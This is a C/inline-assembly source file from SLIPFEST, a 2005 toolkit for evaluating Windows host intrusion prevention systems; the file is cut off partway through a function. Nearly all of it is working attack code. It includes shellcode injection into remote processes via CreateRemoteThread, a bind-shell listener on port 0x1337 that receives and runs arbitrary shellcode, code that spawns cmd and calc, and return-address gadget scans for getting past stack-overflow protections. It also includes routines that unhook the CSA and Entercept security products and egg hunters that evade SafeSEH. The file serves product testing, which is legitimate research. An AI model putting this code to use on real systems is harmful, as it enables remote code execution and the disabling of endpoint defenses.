/* SLIPFEST                                 / \/  \ \/    \                    *
 *                                            /   \   \/\                      *
 *											      /\  /                        *
 * (C) 2005 Yoann GUILLOT                    o      ||   o                     *
 *          Julien TINNES                   -U-     ||  /V\                    *
 *                                          / \     ||  / \                    *
 *                                                                             *
 * System Level Intrusion Prevention Framework Evaluation Suite and Toolkit    *
 *                                                                             *
 *        "c'est la fête du slip!"                                             *
 *                                                                             *
 * SLIPFEST is a Windows 32bits HIPS evaluation suite.                         *
 * Copyright (C) 2005 Y. Guillot & J. Tinnes                                   *
 *                                                                             *
 * This program is free software; you can redistribute it and/or               *
 * modify it under the terms of the GNU General Public License                 *
 * as published by the Free Software Foundation; either version 2              *
 * of the License, or (at your option) any later version.                      *
 *                                                                             *
 * This program is distributed in the hope that it will be useful,             *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of              *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *
 * GNU General Public License for more details.                                *
 *                                                                             *
 * You should have received a copy of the GNU General Public License           *
 * along with this program; if not, write to the                               *
 * Free Software Foundation, Inc.,                                             *
 * 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.               *
 *                                                                             *
 */


#include "stdafx.h"
#include "shellcode.h"

// disable warning "ebp modified by inline asm"
#pragma warning(disable : 4731)

char remote_cleanup[1024];
u32 remote_cleanup_len = 0;

char copy_to_stack[1024];
u32 copy_to_stack_len = 0;

char shellcode[1024];
u32 shellcode_len = 0;

FARPROC shellcode_peptr;

// ptr in the shellcode buffer to the scan base address
char **sc_fixup = 0;
// the currently selected scan base address
char *sc_fixuptarget = 0;
// the different base addresses (cache)
char *sc_startpe = 0;
char *sc_startk32 = 0;
char *sc_memrwx = 0, *sc_memrx = 0, *sc_memrw = 0, *sc_memr = 0;

int target_is_k32 = 0;

char scan_opcodes[] =	"\xc3"				// ret
						"\xff\xd7\xc3"		// call edi ; ret
						"\xff\xd7\xc9\xc3"	// call edi ; leave ; ret
						"\xff\xd0\xc3"		// call eax ; ret
						"\xe8\x44\x58\x99\x12\xc3" // call bla; ret
						"\xff\xd0\xff\xe6"	// call eax ; jmp esi
						"\xff\xd7\xff\xe6";	// call edi ; jmp esi

void setupscanbase(DWORD id)
{
	DWORD oldprot, mprot;
	char **mptr;

	CheckMenuRadioItem(GetMenu(hDlg), ID_SC_RETPE, ID_SC_RETMEMR, id, MF_BYCOMMAND);

	target_is_k32 = 0;

	switch (id) {
	case ID_SC_RETPE:
		if (!sc_startpe)
			sc_startpe = (char*)GetModuleHandle(0);
		sc_fixuptarget = sc_startpe;
		break;

	case ID_SC_RETK32:
		target_is_k32 = 1;
		if (!sc_startk32) {
			sc_startk32 = (char*)GetModuleHandle("kernel32");
			sc_startk32 = (char*)GetProcAddress((HMODULE)sc_startk32, "UTRegister");

			if (!VirtualProtect(sc_startk32, 50, PAGE_EXECUTE_READWRITE, &oldprot)) {
				sc_startk32 = 0;
				showlasterror("virtual readonly");
			} else {

				memcpy(sc_startk32, "\xc2\x1c\x0", 3); // retn 0x1c (just in case someone calls UTRegister) // should set eax..
				memcpy(sc_startk32+3, scan_opcodes, sizeof(scan_opcodes));
				VirtualProtect(sc_startk32, 50, oldprot, &oldprot);
			}
		}
		sc_startk32 = (char*)GetModuleHandle("kernel32");
		sc_fixuptarget = sc_startk32;
		break;

	case ID_SC_RETMEMR:
	case ID_SC_RETMEMRW:
	case ID_SC_RETMEMRX:
	case ID_SC_RETMEMRWX:
		switch(id) {
		case ID_SC_RETMEMR:
			mptr = &sc_memr;
			mprot = PAGE_READONLY;
			break;
		case ID_SC_RETMEMRW:
			mptr = &sc_memrw;
			mprot = PAGE_READWRITE;
			break;
		case ID_SC_RETMEMRX:
			mptr = &sc_memrx;
			mprot = PAGE_EXECUTE_READ;
			break;
		case ID_SC_RETMEMRWX:
			mptr = &sc_memrwx;
			mprot = PAGE_EXECUTE_READWRITE;
			break;
		}

		if (!*mptr) {
			*mptr = (char *)VirtualAlloc(0, sizeof(scan_opcodes), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			if (!*mptr) {
				showlasterror("virtualalloc");
			} else {
				memcpy(*mptr, scan_opcodes, sizeof(scan_opcodes));
				if (!VirtualProtect(*mptr, sizeof(scan_opcodes), mprot, &oldprot)) {
					showlasterror("virtualprotect");
					VirtualFree(*mptr, 0, MEM_RELEASE);
					*mptr = 0;
				}
			}
		}
		sc_fixuptarget = *mptr;
	}
}

/*
 * SHELLCODE REMOTE INJECTION
 */

void init_remote_cleanup(void)
{
	// shellcode that calls what is appended to him, then virtualfrees his argument (where he runs) and exits
	INITSHELLCODE_GENERIC(remote_cleanup);

	_asm {
sc_start:
		push ebp
		mov ebp, esp

		call sc_end

		leave
	}
	FINDK32();
	_asm {
// epilogue: free the memory the caller allocated for us, passed as 1st arg
		pop ecx					// thread retaddr
		pop ebx					// thread arg

		mov edi, H_ExitThread
		call find_proc

		xor edx, edx

		push edx				// arg for exitthread
		push ecx				// exitthread retaddr

		push MEM_RELEASE
		push edx				// sz
		push ebx				// memptr
		push eax				// virtualfree retaddr -> exitthread

		mov edi, H_VirtualFree
		call find_proc

		jmp eax
find_proc:
	}
	FINDPROC();
	_asm sc_end:
}


void init_copy_to_stack(void)
{
	INITSHELLCODE_GENERIC(copy_to_stack);

	_asm {
sc_start:
		mov ecx, 0x200
		sub esp, ecx
		mov edi, esp

		jmp jmp_fwd
call_back:
		pop esi

		shr ecx, 2
		rep movsd

		call esp

		add esp, 0x200
		ret

jmp_fwd:
		call call_back
sc_end:
	}
}


void runshellcode(void)
{
	int remoterun, stackrun;

	remoterun = IsDlgButtonChecked(hDlg, IDC_CHK_RMTRUN) == BST_CHECKED;
	stackrun  = IsDlgButtonChecked(hDlg, IDC_CHK_STKRUN) == BST_CHECKED;

	if (remoterun) {
		u8 *rptr, *rptr_cur;
		DWORD rptr_len;
		HANDLE hRThread;

		if (sc_fixup) {
			if (target_is_k32)
				*sc_fixup = sc_fixuptarget;
			else
				*sc_fixup = (char *)PEbase;

			sc_fixup = 0;
		}

		if (stackrun && shellcode_len > 0x200) {
			addbacklog("shellcode too big for stack!");
			return;
		}

		rptr_len = remote_cleanup_len + (stackrun ? copy_to_stack_len + 0x200 : shellcode_len);
		rptr = rptr_cur = (u8*)VirtualAllocEx(hRemoteProc, 0, rptr_len,
			MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		
		if (!rptr) {
			showlasterror("virtualallocex");
			return;
		}

		if (!WriteProcessMemory(hRemoteProc, rptr_cur, remote_cleanup, remote_cleanup_len, 0))
			goto err_free_write;
		rptr_cur += remote_cleanup_len;

		if (stackrun) {
			if (!WriteProcessMemory(hRemoteProc, rptr_cur, copy_to_stack, copy_to_stack_len, 0))
				goto err_free_write;
			rptr_cur += copy_to_stack_len;
		}

		if (!WriteProcessMemory(hRemoteProc, rptr_cur, shellcode, shellcode_len, 0))
			goto err_free_write;

		if (!VirtualProtectEx(hRemoteProc, rptr, rptr_len, PAGE_EXECUTE_READ, &rptr_len))
			showlasterror("virtualprotect readonly");

		if (!(hRThread = CreateRemoteThread(hRemoteProc, 0, 0, (LPTHREAD_START_ROUTINE)rptr, rptr, 0, 0))) {
			showlasterror("createremotethread");
			goto err_free;
		} else {
			CloseHandle(hRThread);
			char msg[128];
			_snprintf(msg, 128, "remote thread creation successful, buffer at %.8X", rptr);
			addbacklog(msg);
			return;
		}

err_free_write:
		showlasterror("writeprocessmemory");
err_free:
		VirtualFreeEx(hRemoteProc, rptr, 0, MEM_RELEASE);

	} else {
		// local run
		if (stackrun) {
			if (!sc_fixuptarget)
				setupscanbase(ID_SC_RETPE);

			if (sc_fixup && sc_fixuptarget) {
				*sc_fixup = sc_fixuptarget;
				sc_fixup = 0;
			}

			_asm {
				pushad
				mov ebp, esp
				mov ecx, 0x200
				sub esp, ecx
				mov edi, esp
				lea esi, shellcode
				shr ecx, 2
				rep movsd
				call esp
				mov esp, ebp
				popad
			}
		} else {
			// no stack run
			shellcode_peptr();
		}
	}
}


void calc_sc_hash(void)
{
	char proc[512];
	u32 hashval = 0;

	GetDlgItemText(hDlg, IDC_EDIT2, proc, 50);
	_asm {
		push esi
		push ebx
		lea esi, proc
	}
	HASHNAME();
	_asm {
		mov hashval, ebx
		pop ebx
		pop esi
	}

	_snprintf(proc+50, 512-50, "#define H_%s 0x%.8lX", proc, hashval);
	addbacklog(proc+50);
}


void init_bindlistenexecute(void)
{
	INITSHELLCODE;
	_asm sc_start:
	FINDK32();
	_asm {
		// TODO disable the firewall (netsh?)
		//      let the user select the port number to use
		push ebp
		mov ebp, esp

		push '23'
		push '_2sw'
		push esp		// 'ws2_32'
		mov edi, H_LoadLibraryA
		call find_proc
		call eax

		push eax		// handle to ws2_32 for freelibrary
		push esi		// k32 handle

		mov esi, eax

		push ebp
		mov ebp, esp

		sub esp, 0x1B0

		push esp
		push 0x0202
		mov edi, H_WSAStartup
		call find_proc
		call eax

		push 6
		push 1
		push 2
		mov edi, H_socket
		call find_proc
		call eax

		push eax			// our socket

		mov ebx, eax		// check -1
		inc ebx
		test ebx, ebx
		jz out_close

		lea ebx, [ebp-0x100]			// sockaddr_in
		mov word ptr [ebx], 2			// sa_family
		mov word ptr [ebx+2], 0x8769	// 0x1337	// sin_port
		mov dword ptr [ebx+4], 0		// sin_addr
		
		push 0x10			// sockaddr length
		push ebx
		push eax
		mov edi, H_bind
		call find_proc
		call eax

		test eax, eax
		jnz out_close

		pop eax				// our socket
		push eax

		push 1				// backlog
		push eax
		mov edi, H_listen
		call find_proc
		call eax

		test eax, eax
		jnz out_close

acceptagain:
		pop eax				// our socket
		push eax

		push 0
		push 0				// sockaddr
		push eax
		mov edi, H_accept
		call find_proc
		call eax

		push eax			// accepted socket

		mov ebx, eax
		inc ebx
		test ebx, ebx
		jz closeandagain

		push 0
		push 4
		lea ebx, [ebp-0x104]	// buffer (will receive length of shellcode)
		push ebx
		push eax
		mov edi, H_recv
		call find_proc
		call eax
		cmp eax, 4
		jnz closeandagain

		mov ecx, dword ptr [ebp-0x104]	// read the shellcode length
		test ecx, ecx
		jz closeandfinish

		pop eax				// accepted socket
		push eax

		push ebp
		mov ebp, esp
		sub esp, ecx

		push ebp
		mov ebp, esp

		lea ebx, [ebp+4]
		push ecx			// sc length

		push 0
		push ecx
		push ebx
		push eax
		mov edi, H_recv
		call find_proc
		call eax

		pop ecx				// check length
		cmp eax, ecx
		pop eax
		jnz leavecloseandagain

		mov ebp, esp
		call eax			// run shellcode
							// it must preserve ebp and not trash the stack above esp and return
		mov esp, ebp

leavecloseandagain:
		leave
		leave

closeandagain:
		// [esp] = accepted socket
		mov edi, H_closesocket
		call find_proc
		call eax

		jmp acceptagain

closeandfinish:
		// [esp] = accepted socket
		mov edi, H_closesocket
		call find_proc
		call eax

out_close:
		// [esp] = listening socket
		mov edi, H_closesocket
		call find_proc
		call eax

		mov edi, H_WSACleanup
		call find_proc
		call eax

		leave

		pop esi		// cleanup & ret
		// [esp] = ws2_32 handle
		mov edi, H_FreeLibrary
		call find_proc
		call eax

		leave
		ret
find_proc:
	}
	FINDPROC();
	_asm sc_end:
}

void init_exitprocess(void)
{
	INITSHELLCODE;
	_asm sc_start:
	FINDK32();
	_asm {
		push 0
		mov edi, H_ExitProcess
		call find_proc
		call eax
find_proc:
	}
	FINDPROC();
	_asm sc_end:
}

void init_getcommandline(void)
{
	INITSHELLCODE;
	_asm {
sc_start:
		pushad
	}
	FINDK32();
	_asm {
		mov ecx, 0x200
		sub esp, ecx
		mov ebp, esp

		push ecx
		push ebp
		push 0
		mov edi, H_GetModuleFileNameA
		call find_proc
		call eax

		push ebp

		mov edi, H_GetCommandLineA
		call find_proc
		call eax

		push eax
		call do_msgbox

		add esp, 0x200

		popad
		ret

do_msgbox:
	}
	DOMSGBOX();
	_asm find_proc:
	FINDPROC();
	_asm sc_end:
}


/*
 * ACCESS CONTROL
 */

// hack to ease string integration into shellcode
#define x _asm _emit

void init_createproc_wexec(void)
{
	INITSHELLCODE;
	_asm {
//		lock mov dword ptr fs:[ebx+ecx+0x22222222], 0x11111111
sc_start:
		pushad  
	}
	FINDK32();
	_asm {
		push 1
		call pusharg
		x'c' x'a' x'l' x'c' x 0
pusharg:
		mov edi, H_WinExec
		call find_proc
		call eax

		popad
		ret

find_proc:
	}
	FINDPROC();
	_asm sc_end:
}

void init_createproc(void)
{
	INITSHELLCODE;
	_asm {
sc_start:
		pushad  
		mov ebp,esp 
		mov ecx, 0x58
		sub esp, ecx
		mov edi, esp
		mov eax, 0x44		// sizeof(startupinfo)
		stosd
		shr ecx, 2
		dec ecx
		xor eax, eax
		rep stosd

		lea ebx,[ebp-0x10]
		push ebx
		lea ebx,[ebp-0x58]
		push ebx
		push eax
		push eax
		push eax
		push 0x20
		push eax
		push eax
		call str_calc
		// db "C:\\WINDOWS\\SYSTEM32\\calc.exe", 0
		x'C' x':' x'\\'x'W' x'I' x'N' x'D' x'O' x'W' x'S'
		x'\\'x'S' x'Y' x'S' x'T' x'E' x'M' x'3' x'2' x'\\'
		x'c' x'a' x'l' x'c' x'.' x'e' x'x' x'e' x 0
str_calc:
		push eax
	}
	FINDK32();
	_asm {
		mov edi, H_CreateProcessA
		call find_proc
		call eax
// CreateProcess(0, "C:\\WINDOWS\\SYSTEM32\\calc.exe", 0, FALSE, NORMAL_PRIORITY_CLASS, 0, 0, &startupinfo, &procinfo);

		mov edi, H_CloseHandle
		call find_proc
		mov edi, eax
		mov eax, [ebp-0xc]		// procinfo.hThread
		push eax
		call edi

		mov eax, [ebp-0x10]
		push eax
		call edi

		mov esp, ebp
		popad
		ret

find_proc:
	}
	FINDPROC();
	_asm sc_end:
}


int init_createfile(void)
{
	INITSHELLCODE;

	_asm {
sc_start:
		pushad
	}
	FINDK32();
	_asm {
		xor eax, eax
		push eax
		push eax
		push 4		// OPEN_ALWAYS
		push eax
		push eax
		push 0xc0000000
		call pushfname
		x't' x'e' x's' x't' x'f' x'i' x'l' x'e' x 0
pushfname:
		mov edi, H_CreateFileA
		call find_proc
		call eax		// CreateFile("testfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_ALWAYS, 0, 0);
		test eax, eax
		jz open_err

		push eax
		mov edi, H_CloseHandle
		call find_proc
		call eax

open_ok:
		xor eax, eax
		push eax	// 0
		push esp	// ""
		call msgbox
		x'c' x'r' x'e' x'a' x't' x'e' x'd' x 0

open_err:
		xor eax, eax
		push eax
		push esp	// ""
		call msgbox
		x'e' x'r' x'r' x'o' x'r' x 0

msgbox:
		call do_msgbox

		pop eax		// dummy 0

		popad
		ret

do_msgbox:
	}
	DOMSGBOX();
	_asm find_proc:
	FINDPROC();
	_asm sc_end:
}

int init_ntcreatefile(void)
{
	INITSHELLCODE;

	_asm {
sc_start:
		pushad
	}
	FINDK32();
	_asm {
		xor eax, eax
		push eax
		push esp	// ""
		call msgbox
		x'n' x'o' x't' x' ' x'i' x'm' x'p' x'l' x'e' x'm'
		x'e' x'n' x't' x'e' x'd' x 0

msgbox:
		call do_msgbox

		pop eax		// dummy 0

		popad
		ret

do_msgbox:
	}
	DOMSGBOX();
	FINDPROC();
	_asm sc_end:
}

UNICODE_STRING *str2unicode(char *str)
{
#define USTR_LEN 500
	static wchar_t ustr[USTR_LEN];
	static UNICODE_STRING ret;
	ret.Buffer = ustr;
	ret.MaximumLength = USTR_LEN * sizeof(wchar_t);

	memset(&ustr, 0, USTR_LEN * sizeof(wchar_t));

	ret.Length = strlen(str) * sizeof(wchar_t);

	if (ret.Length > ret.MaximumLength)
		ret.Length = ret.MaximumLength - sizeof(wchar_t);
	unsigned i;
	for (i = 0 ; i < ret.Length/sizeof(wchar_t) ; i++)
		ustr[i] = (wchar_t)str[i];

	return &ret;
}

int tryopenfilesys(void)
{
	HANDLE fh;
	OBJECT_ATTRIBUTES oa;
	IO_STATUS_BLOCK status;
	PUNICODE_STRING filename;
	char dir[500];

	HMODULE hDll = GetModuleHandle("ntdll");
	if (!hDll) {
		showlasterror("getmodulehandle ntdll");
		return 0;
	}

	NTSTATUS ret;
	t_NtCreateFile myNtCreateFile = (t_NtCreateFile)GetProcAddress(hDll, "NtCreateFile");
	t_NtClose myNtClose = (t_NtClose)GetProcAddress(hDll, "NtClose");

	dir[0] = dir[3] = '\\'; dir[1] = dir[2] = '?';
	GetCurrentDirectory(500, dir+4);
	strncat(dir, "\\testfile", 500);
// addbacklog(dir);
	filename = str2unicode(dir);
	InitializeObjectAttributes(&oa, filename, 0, 0, 0);

// MessageBoxA(0, "ntcreatefile", "", 0);
	ret = myNtCreateFile(&fh, GENERIC_READ|GENERIC_WRITE, &oa, &status, 0, 0, 0, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE, 0, 0);
	if (ret < 0) {
		_snprintf(dir, 500, "ntcreatefile failure: ntstatus = %.8lX", ret);
		dir[499] = 0;
		addbacklog(dir);
		return 0;
	} else
		addbacklog("ntcreatefile ok");

// MessageBoxA(0, "ntclosefile", "", 0);
	ret = myNtClose(fh);
	if (ret < 0) {
		_snprintf(dir, 500, "ntcreatefile failure: ntstatus = %.8lX", ret);
		dir[499] = 0;
		addbacklog(dir);
		return 0;
	} else
		addbacklog("ntclosefile ok");

	return 0;
}

/*
 * STACK OVERFLOW
 */
void init_shellc_simple(void)
{
	INITSHELLCODE;

	_asm {
sc_start:
		pushad
	}
	FINDK32();
	_asm {
		push 1
		call push_arg
		x'c' x'm' x'd' x 0
push_arg:

		mov edi, H_WinExec
		call find_proc
		call eax

		popad
		ret
find_proc:
	}
	FINDPROC();
	_asm sc_end:
}


#define SETUPSCAN \
	_asm { fixmeup: } \
	_asm { push 0x00400000 } \
	_asm { xor ecx, ecx } \
	_asm { dec ecx }

// calls WinExec("cmd", 1) with eax as return address, defines find_proc and sc_end
#define CALLAPI \
	_asm { push ebx } \
	_asm { push eax } \
	FINDK32(); \
	_asm { pop eax } \
	_asm { pop ebx } \
	_asm { push 1 } \
	_asm { call push_arg } \
	_asm { _emit 'c' } \
	_asm { _emit 'm' } \
	_asm { _emit 'd' } \
	_asm { _emit  0  } \
	_asm { push_arg: } \
	_asm { push eax } \
	_asm { mov edi, H_WinExec } \
	_asm { call find_proc } \
	_asm { jmp eax } \
	_asm { find_proc: } \
	FINDPROC(); \
	_asm { sc_end: }

#define CALLAPISETESI(value) \
	_asm { push ebx } \
	_asm { push eax } \
	FINDK32(); \
	_asm { pop eax } \
	_asm { pop ebx } \
	_asm { push 1 } \
	_asm { call push_arg } \
	_asm { _emit 'c' } \
	_asm { _emit 'm' } \
	_asm { _emit 'd' } \
	_asm { _emit 0  } \
	_asm { push_arg: } \
	_asm { push eax } \
	_asm { mov edi, H_WinExec } \
	_asm { call find_proc } \
	_asm { mov esi, value } \
	_asm { jmp eax } \
	_asm { find_proc: } \
	FINDPROC(); \
	_asm { sc_end: }

void init_shellc_retret(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		ret

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
		pop edi
		mov al, 0xc3			// ret
		repnz scasb
		lea eax, [edi-1]		// assume success

		call push_retaddr
		
		popad
		ret

push_retaddr:
	}
	CALLAPI;
}

void init_shellc_retcall(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		call edi
		ret

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xff			// ret
		pop edi
		repnz scasb
		push edi
		mov al, 0xd7
		scasb
		jnz searchagain
		mov al, 0xc3
		scasb
		jnz searchagain

		pop eax
		inc eax

		call push_retaddr
		
		popad
		ret

push_retaddr:
	}
	CALLAPI;
}

void init_shellc_retcallretret(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		call edi
		ret

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xff			// ret
		pop edi
		repnz scasb
		push edi
		mov al, 0xd7
		scasb
		jnz searchagain
		mov al, 0xc3
		scasb
		jnz searchagain

		pop eax
		inc eax

		call push_retaddr
		
		popad
		ret

push_retaddr:
		mov ecx, 400			// number of chained ret - 50 for csa
pushmore:
		push eax
		loop pushmore
	}
	CALLAPI;
}

void init_shellc_retcallregret(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		call edi
		ret

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xff			// ret
		pop edi
		repnz scasb
		push edi
		mov al, 0xd7
		scasb
		jnz searchagain
		mov al, 0xc3
		scasb
		jnz searchagain

		pop eax
		inc eax

		call push_retaddr
		
		popad
		ret

push_retaddr:
	}
	CALLAPI;
}

void init_shellc_retcallleave(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		call edi
		leave
		ret

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xff			// ret
		pop edi
		repnz scasb
		push edi
		mov al, 0xd7
		scasb
		jnz searchagain
		mov al, 0xc9
		scasb
		jnz searchagain
		mov al, 0xc3
		scasb
		jnz searchagain

		pop eax
		inc eax

		call push_retaddr
		
		popad
		ret

push_retaddr:
		push ebp
		mov ebp, esp

	}
	CALLAPI;
}

void init_shellc_retcalljmpesi(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		call edi
		jmp esi

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xff			// ret
		pop edi
		repnz scasb
		push edi
		mov al, 0xd7
		scasb
		jnz searchagain
		mov al, 0xff
		scasb
		jnz searchagain
		mov al, 0xe6
		scasb
		jnz searchagain

		pop eax
		inc eax

		call push_retaddr
		
		popad
		ret

push_retaddr:
		pop ebx
	}
	CALLAPISETESI(ebx);
}

void init_shellc_retcallregjmpesi(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		call edi
		jmp esi

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xff			// ret
		pop edi
		repnz scasb
		push edi
		mov al, 0xd7
		scasb
		jnz searchagain
		mov al, 0xff
		scasb
		jnz searchagain
		mov al, 0xe6
		scasb
		jnz searchagain

		pop eax
		inc eax

		call push_retaddr
		
		popad
		ret

push_retaddr:
		pop ebx
	}
	CALLAPISETESI(ebx);
}

void init_shellc_retcalladdr(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		push 0
		push 0
		call callme
//call [esi+0x4002]
		ret
callme:
//		jmp [esi+0x40019]
		// csa allow up to 20 instructions before the jump
		nop
		add [eax+esi+0x30040], 0x2344
		nop
		nop
		nop
		jmp dword ptr WinExec

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xe8			// call
//mov al, 0xff
		pop edi
		repnz scasb
//mov al, 0x96
//scasb
		push edi
//jnz searchagain
		scasd					// consume offset
		mov al, 0xc3
		scasb
		jnz searchagain

		pop eax
		add eax, 4

		call push_retaddr
		
		popad
		ret

push_retaddr:
	}
	CALLAPI;
}

void init_shellc_frame(void)
{
	INITSHELLCODE_FIXUP;

	_asm {
		// the sequence the shellcode searches
		call edi
		ret

sc_start:
		pushad
	}
	SETUPSCAN;
	_asm {
searchagain:
		mov al, 0xff			// ret
		pop edi
		repnz scasb
		push edi
		mov al, 0xd7
		scasb
		jnz searchagain
		mov al, 0xc3
		scasb
		jnz searchagain

		pop eax
		inc eax

		call push_retaddr
		
		popad
		ret

push_retaddr:
		xor ebp, ebp
	}
	CALLAPI;
}

/*
 * SPECIFIC SYSTEM DISABLE
 */
void init_csaunhook(void)
{
	INITSHELLCODE;

	_asm {
sc_start:
		pushad

		mov edi, 0x10100000		// csauser.dll base 
		push edi
		add edi, [edi+0x3c]
		pop esi
		add esi, [edi+0x28]		// entry point

		push 1
		push DLL_PROCESS_DETACH
		push 0
		call esi

		// Does not work

		popad
		ret
sc_end:
	}
}

void init_enterceptunhook(void)
{
	INITSHELLCODE;

	_asm {
sc_start:
		pushad

		// search "hidapistub.dll" base address from the peb

		mov eax, fs:[0x30]		// peb
		mov eax, [eax+0x0C]		// ldr
		lea ebx, [eax+0x0C]		// &ldr->listhead
		mov edx, [ebx]			// edx = listnode

loop_next:
		mov esi, [edx+0x30]		// basename.buffer
		call pushtarget
		x'h' x'i' x'd' x'a' x'p' x'i' x's' x't' x'u' x'b' x'.' x'd' x'l' x'l'

pushtarget:
		pop edi
		mov ecx, 14				// dll name len

cmp_next:
		lodsw
		or al, 0x20
		scasb
		jnz no_match
		loop cmp_next

		// found it
		mov esi, [edx+0x18]		// baseaddr
		mov edi, H_ENTERCEPT
		call find_proc
		test eax, eax
		jz loop_end				// function not found

		mov ebp, esp
		call eax
		mov esp, ebp			// just in case it take args
		
		jmp loop_end

no_match:
		mov edx, [edx]
		cmp edx, ebx
		jnz loop_next

loop_end:
		popad
		ret

find_proc:
	}
	FINDPROC();
	_asm sc_end:
}

/*
 * EGGHUNT
 */
void init_egg(void)
{
	INITSHELLCODE;

	_asm {
sc_start:
		// skip the caller (it would free the memory we are in)
		// MUST be called by remote_cleanup (or by any (void)(*func)(1arg) with a frame ptr)
		leave
		ret 4
	}
	EGG();
	_asm pushad
	FINDK32();
	_asm {
		push '\0gge'			// "egg"
		mov eax, esp

		push eax
		push eax
		call do_msgbox

		pop eax

		popad
		ret

bla:
		jmp bloo
	}
	FINDPROC();
	_asm {
bloo:
		call bla

do_msgbox:
	}
	DOMSGBOX();
	FINDPROC();
	_asm sc_end:
}

void init_egghunt(void)
{
	INITSHELLCODE;
	_asm {
sc_start:
		pushad
		xor edi, edi

		push dword ptr fs:[edi]				// backup UEH

		call setup_ueh		// push addr of myueh

// ueh start
		mov eax, [esp+0x0c]	// 3rd arg
		add eax, 0x7c
		add dword ptr [eax+0x21], 0x10		// context ptr to edi + 1 (add 4k to edi)
		cmp word ptr [eax+0x22], 0xffff
		jb ueh_retloc

		call ueh_end_loop
		jmp walk_loop_end
ueh_end_loop:
		pop dword ptr [eax+0x3c]	// mov eip, walk_loop_end

ueh_retloc:
		xor eax, eax		// resume execution
		ret					// the caller restores its stack himself
// ueh end

setup_ueh:
		push -1
		mov fs:[edi], esp
		mov eax, EGG_VALUE

walk_loop_next:
		cmp edi, 0xFFFFFFF0
		jae walk_loop_end
		scasd
		jnz walk_loop_next
		scasd
		jnz walk_loop_next

egg_found:
		call edi

walk_loop_end:
		pop eax				// ueh->next = -1
		pop ebx				// ueh->h
		inc eax
		pop dword ptr fs:[eax]		// restore ueh
		popad
		ret
sc_end:
	}
}

void init_egghunt_sp2(void)
{
	INITSHELLCODE;

	/*
	 * egg hunter
	 * under windows sp2, the seh chain is validated by checking that
	 * each exception handler is :
	 * not on the stack, and
	 * either in a module at an offset listed in the CONFIG PE directory of that module
	 * either in memory not in a module
	 * 
	 * the structure pointing to the handler must be on the stack
	 * 
	 * so here we overwrite teb->stackbase (offset 4) with esp so that
	 * the egghunt registers his handler, which is outside the stack (as seen in the teb)
	 * with a structure pushed on the stack
	 */
	_asm {
sc_start:
		pushad
		xor edi, edi

		// fake stackbase
		push dword ptr fs:[edi+4]
		mov fs:[edi+4], esp

		push dword ptr fs:[edi]				// backup UEH

		call setup_ueh		// push addr of myueh
// ueh start
		mov eax, [esp+0x0c]	// 3rd arg
		add eax, 0x7c
		add dword ptr [eax+0x21], 0x10		// context ptr to edi + 1 (add 4k to edi)
		cmp word ptr [eax+0x22], 0xffff
		jb ueh_retloc

ueh_pushendloop:
		call ueh_end_loop
		jmp walk_loop_end
ueh_end_loop:
		pop dword ptr [eax+0x3c]	// mov eip, walk_loop_end

ueh_retloc:
		xor eax, eax		// resume execution
		ret					// the caller restores its stack himself
// ueh end

setup_ueh:
		push -1
		mov fs:[edi], esp
		mov eax, EGG_VALUE

walk_loop_next:
		cmp edi, 0xFFFFFFF0
		jae walk_loop_end
		scasd
		jnz walk_loop_next
		scasd
		jnz walk_loop_next

egg_found:
		call edi

walk_loop_end:
		pop eax				// ueh->next = -1
		pop ebx				// ueh->h
		inc eax
		pop dword ptr fs:[eax]		// restore ueh
		pop dword ptr fs:[eax+4]	// restore stackbase
		popad
		ret
sc_end:
	}
}

void init_testNX(void)
{
	INITSHELLCODE;
	_asm {
sc_start:
		pushad
	}
	FINDK32();
	_asm {
// remove the load_config dir in the pe, to disable safeseh
		mov edi, H_VirtualProtect
		call find_proc
		mov ebp, eax

		push 0
		mov edi, H_GetModuleHandleA
		call find_proc
		call eax

		push eax			// backup modulehandle

		push 0				// oldprotect

		push esp
		push 0x04			// rw
		push 0x1000
		push eax
		call ebp
		
		pop ebx
		pop ecx
		mov eax, ecx
		add eax, [eax+0x3c]
		add eax, 0x78		// directory[0]
		lea edi, [eax+0x50]	// 10*8
		xor eax, eax
		stosd				// rva
		stosd				// size

		push 0

		push esp
		push ebx			// oldprot
		push 0x1000
		push ecx
		call ebp
		
		pop eax
// done

		// alloc 4 bytes, set some dummy instr in it
		mov edi, H_VirtualAlloc
		call find_proc

		push 0x04			// prot: PAGE_READWRITE
		push 0x3000			// flags: MEM_COMMIT | MEM_RESERVE
		push 4				// sz
		push 0				// preferedaddress
		call eax

		push eax			// save address for free

		mov ebp, esp

		test eax, eax
		jz error_alloc

		mov dword ptr [eax], 0xC3FFCB80		// or bl,0xff ; ret
//		mov dword ptr [eax], 0xC3FF0B80		// or bptr [ebx],0xff ; ret		// test ueh

		// setup UEH, which will be called upon execution denied
		// backup original UEH
		push dword ptr fs:[0]

		// push the addr of our UEH
		call push_ueh

// ueh proc start
		mov eax, [esp+0x0c]	// 3rd arg (undoc?) = context offset
